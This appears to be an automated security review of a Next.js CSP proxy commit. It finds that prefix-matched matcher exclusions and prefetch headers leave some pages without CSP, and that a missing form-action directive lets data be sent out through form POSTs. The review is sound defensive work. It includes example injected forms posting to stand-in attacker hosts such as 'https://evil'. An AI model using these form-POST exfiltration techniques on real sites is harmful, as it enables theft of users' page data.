# Security Review — mfc-csp (CSP proxy with strict-dynamic per-request nonces)

**Commit:** d90d6bb
**Scope:** `git diff d86d2dc...HEAD` — `proxy.ts` (new CSP proxy), `app/layout.tsx` (static-render opt-out)
**Date:** 2026-08-17
**Based on:** `/workspace/runs/review-arms/e8-evidence-pipeline/mfc-csp/code-fact-check-report.md` (k=2, 20 claims; executed matcher + header probes bind here — not re-verified)

No HALT-escalation pattern matched (no plaintext secrets, no unauthenticated privileged endpoint, no injection sink, no disabled TLS, no hardcoded keys). Proceeding with the normal review.

## Trust Boundary Map

```
B1 (new): [HTTP request: path + next-router-prefetch/purpose headers] → [proxy.ts config.matcher] → [CSP header attached | omitted]
B2 (new): [attacker-influenced markup in a rendered CSP-protected page] → [served CSP directive set, browser-enforced] → [script / style / form-submit / connection]
B3 (new): [request.headers clone + x-nonce set] → [server-component headers()] → [nonce baked into rendered HTML <script> tags]
```

B1 is the decisive boundary the diff introduces: the matcher decides which responses receive *any* CSP at all — an excluded request ships with **no CSP header**, so exclusion is a security decision, not a performance one. B2 is what the policy does once present: it governs which content classes an injected foothold could still abuse. B3 is an internal forwarding channel (nonce → server component), executed-verified by the fact-check (Claim 8) and not attacker-reachable; no finding sits on it.

The diff's core trust assumption: "everything the matcher excludes is safe to serve without CSP, and the directive set covers every dangerous content class on everything it includes." Move #11 tests both halves.

---

## Move #11 — bypass enumeration (mandatory for both guardrails)

### Guardrail A — the matcher (`proxy.ts:55-61`): which requests get CSP

The matcher source `"/((?!api|_next/static|_next/image|favicon.ico).*)"` uses a **prefix** negative-lookahead applied at the position right after the leading `/`, plus `missing:` conditions that drop prefetch-headered requests. Bypass candidates — requests that slip the matcher and thus ship with **no CSP**:

| # | Candidate | Status | Outcome |
|---|-----------|--------|---------|
| A1 | Full-document prefetch (`purpose: prefetch` / `next-router-prefetch`) of an HTML page | **Tested** (fact-check Claim 9, executed) | SKIP → no CSP header on the response |
| A2 | Page route whose first segment *starts with* `api` (`/apidocs`, `/api-keys`, `/apikey-help`) | **Tested** (regex, `evidence/sec-matcher-regex.txt`) | SKIP → no CSP |
| A3 | Page route starting `_next/static` / `_next/image` as a literal prefix (`/_next/staticx`) | **Tested** (regex) | SKIP → no CSP |
| A4 | Unescaped `.` in `favicon.ico` lookahead matches any char (`/faviconXico`, `/favicon.icoX`) | **Tested** (regex) | SKIP → no CSP |
| A5 | Uppercase `/API/...`, or `api` as a non-leading segment (`/settings/apidata`) | **Tested** (regex) | MATCH → CSP applied (fails safe — not a bypass) |

Regex test faithfully reproduces Next's compilation of the `source` (the negative-lookahead is passed through verbatim; anchoring/trailing-slash do not affect lookahead semantics). Evidence: `evidence/sec-matcher-regex.txt`.

**Security meaning of A1 (the exclusion the task flags):** because an excluded request receives *no* CSP header, any content served on a prefetch path is delivered with zero script/style/form/frame restrictions. Next `<Link>` default prefetch fetches RSC payloads (not script-executing documents), so the *live* app does not currently emit a full-HTML prefetch — but the mechanism is a standing hole: the moment a full-document prefetch path exists (`<link rel="prefetch">`, Speculation Rules, or a browser that speculatively prefetches the document), that document renders unprotected. This is the documented Next-middleware-matcher CSP gotcha.

**Security meaning of A2–A4:** the exclusions are prefix-matched, not segment-exact (`api`, not `api/`). Any page route whose first path segment merely *begins with* one of the excluded literals silently loses CSP. A4 compounds this: the unescaped `.` widens `favicon.ico` to `favicon?ico`. Currently only `/` is a page route (`app/page.tsx`), so A2–A4 are **latent** — but they are reachable by ordinary development (adding `app/apikeys/page.tsx` ships an HTML page with no CSP and no warning).

### Guardrail B — the CSP directive set (`proxy.ts:20-31`): what the policy covers

Served directive set (fact-check-captured header, `evidence/r1-curl-root-headers.txt`): `default-src 'self'; script-src 'self' 'nonce-…' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; object-src 'none'`. Bypass candidates — content classes an injected foothold could still abuse:

| # | Candidate | Status | Outcome |
|---|-----------|--------|---------|
| B1 | **No `form-action` directive** → injected/auto-submitting `<form action="https://evil">` POSTs data cross-origin | **Tested (static, on served header)** — directive absent in the captured header | Exfil via form-POST is *not* restricted; `form-action` does **not** fall back to `default-src` per CSP3 |
| B2 | `style-src 'unsafe-inline'` → injected inline CSS (attribute-selector + `background-image` value exfil, UI redress) | **Listed — untested** | Requires a browser to demonstrate the exfil channel; carve-out is deliberate (fact-check Claim 5) but its exfil surface was not exercised |
| B3 | `img-src … data: blob:` → injected `<img src=data:…>` / CSS `url(data:)` as a same-document channel | **Listed — untested** | Cross-origin img exfil is blocked (`'self'`); only same-doc data:/blob: allowed — low-value, not exercised |
| B4 | No `require-trusted-types-for 'script'` → DOM-XSS sinks (`innerHTML`) unguarded | **Tested (static, fact-check Claim 10)** | Defense-in-depth only; Claim 10 established no `dangerouslySetInnerHTML`/`rehype-raw`, KaTeX `trust:false` — no current sink |
| B5 | `connect-src 'self'` → fetch/XHR/WebSocket/beacon exfil to attacker origin | **Tested (static, on served header)** | Blocked to `'self'` — the primary scripted-exfil channel is closed (which is exactly why B1's form-POST channel matters) |

The load-bearing interaction: `connect-src 'self'` (B5) correctly closes scripted exfil, but the **missing `form-action`** (B1) re-opens a cross-origin exfil channel that does not require script execution at all — so `strict-dynamic`'s script lockdown does not cover it.

---

## Findings

#### Matcher excludes prefetched responses from CSP — full-document prefetch path renders unprotected

**Severity:** Medium
**Location:** `proxy.ts:58-60` (matcher `missing:` conditions)
**Boundary:** B1
**Move:** #11 (A1), #1
**Confidence:** Low

The `missing:` conditions strip CSP from any request carrying `next-router-prefetch` or `purpose: prefetch` (fact-check Claim 9, executed: those requests received no CSP header). The intent — don't burn a nonce on RSC prefetches — is reasonable, but the mechanism excludes *all* prefetch-headered responses, including a full HTML document if any prefetch path fetches one. Such a document is then rendered on navigation with no script-src/strict-dynamic/form-action/frame-ancestors protection. The live app uses default `<Link>` prefetch (RSC payloads, not documents), so this is not currently reachable; confidence is Low for that reason. But the hole is standing: adding `<link rel="prefetch">`, Speculation Rules, or serving under a browser that speculatively prefetches documents makes it live with no warning.

**Recommendation:** Do not exclude document responses by prefetch header. Either scope the CSP skip to RSC content-type rather than the prefetch headers, or keep the header on prefetched documents (a nonce on an unpainted prefetch is cheap). At minimum, document that CSP intentionally does not cover prefetched documents.

#### Matcher exclusions are prefix-matched, not segment-exact — page routes starting with `api`/`_next/...`/`favicon?ico` ship with no CSP

**Severity:** Medium
**Location:** `proxy.ts:57` (`source` negative-lookahead)
**Boundary:** B1
**Move:** #11 (A2–A4)
**Confidence:** Low

The negative-lookahead `(?!api|_next/static|_next/image|favicon.ico)` excludes any first path segment that merely *begins with* those literals, and the unescaped `.` widens `favicon.ico` to match `favicon<any>ico`. Regex test (`evidence/sec-matcher-regex.txt`) confirms `/apidocs`, `/api-keys`, `/apikey-help`, `/_next/staticx`, `/faviconXico` all SKIP → no CSP, while a genuine page like `/settings/apidata` correctly MATCHES. Only `/` exists as a page route today (`app/page.tsx`), so this is latent — but it is a silent trap: a future `app/apikeys/page.tsx` renders an HTML page with a real script surface and receives no CSP, with nothing flagging it.

**Recommendation:** Anchor the exclusions to whole segments — `(?!api|_next/static|_next/image|favicon\.ico)(?:/|$)` — and escape the dot in `favicon\.ico`. This makes the exclusion match the actual API/static namespaces and nothing that merely shares a prefix.

#### CSP omits `form-action` — form-POST exfiltration bypasses `connect-src 'self'`

**Severity:** Medium
**Location:** `proxy.ts:20-31` (directive list)
**Boundary:** B2
**Move:** #11 (B1), #1
**Confidence:** Low

The served policy locks scripted network egress to `connect-src 'self'`, but omits `form-action`, which does not inherit from `default-src`. An injected or dangling-markup `<form action="https://attacker">` (auto-submitted) therefore exfiltrates page data cross-origin without executing any script — outside everything `strict-dynamic` governs. Exploitability depends on a non-script injection foothold, which fact-check Claim 10 indicates the app currently lacks (no `dangerouslySetInnerHTML`/`rehype-raw`), hence Low confidence — but the directive gap is a real hole in the exfil-prevention posture the rest of the policy carefully builds.

**Recommendation:** Add `form-action 'self'` (and, since `frame-ancestors 'none'` is already set, consider `base-uri 'none'` if no `<base>` is used). One line closes the cross-origin form-POST channel to match `connect-src`.

---

## Endorsement Claims

The matcher and the CSP directive set are guardrails with untested bypass candidates (A1–A4, B1–B5 above) and therefore do **not** appear here. The claims below are atomic properties feeding the strict-dynamic story that are not themselves the bypass-analyzed guardrail.

- **Claim:** The per-request nonce is derived from `crypto.randomUUID()` (base64-encoded), i.e. from a cryptographic UUID source rather than `Math.random`/time.
  **Location:** `proxy.ts:37`
  **Evidence:** executed (via fact-check Claims 7a/7b/1c — distinct well-formed base64-UUID nonces observed on consecutive requests, dev + prod)
  **Verified:** the emitted header value on matched requests is a fresh base64 of a v4 UUID each request (`evidence/r1-nonce-freshness.txt`, `evidence/r2-curl-probes.log`).
  **Not verified:** browser-side rejection of a non-nonced injected `<script>` (no browser in the sandbox — one hop away).
  **route: code-fact-check**

- **Claim:** Every Next-generated `<script>` tag in the served `/` document carries the nonce matching that response's CSP header, and no app code reads `x-nonce` itself.
  **Location:** `app/layout.tsx:28-31`, `proxy.ts:41-47`
  **Evidence:** executed (via fact-check Claims 2/12 — 36 script tags, 0 without a nonce, single distinct nonce equal to the header's, dev + prod)
  **Verified:** the rendered document's script tags are nonce-tagged with the header value on the root route.
  **Not verified:** script tags emitted during client-side navigation to a *different* route (only `/` was captured — one hop away).
  **route: code-fact-check**

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence |
|---|---------|----------|----------|----------|------------|
| 1 | Prefetch-excluded documents ship with no CSP | Medium | B1 | `proxy.ts:58-60` | Low |
| 2 | Prefix (not segment) matcher exclusions → pages starting `api`/`_next/*`/`favicon?ico` get no CSP | Medium | B1 | `proxy.ts:57` | Low |
| 3 | Missing `form-action` → form-POST exfil bypasses `connect-src 'self'` | Medium | B2 | `proxy.ts:20-31` | Low |

## Overall Assessment

This is a well-constructed CSP for the one route it currently protects: `strict-dynamic` + per-request cryptographic nonce is the right shape, `connect-src`/`object-src`/`base-uri`/`frame-ancestors` are locked down, and the fact-check confirmed by execution that the served document's scripts are all correctly nonced. The security weaknesses are all at the **matcher boundary (B1)** and one **directive gap (B2)** — none is exploitable against the app as it exists today (only `/` is a page route, no full-document prefetch path, no injection foothold), which is why all three findings are Low confidence. But all three are named, reachable mechanisms that convert a normal future change (adding a page route, adding a prefetch link, or any dangling-markup injection) into a silent CSP hole, so each sits at the Medium severity floor rather than below it. The single most important fix is #2: anchor the matcher exclusions to whole path segments and escape the dot, so the "which responses get CSP" decision stops depending on prefix coincidence. This is not a categorical all-clear — no findings within the code paths read, and both endorsement claims are pending execution verification via code-fact-check (browser enforcement and client-navigation script tagging remain the unread hops).
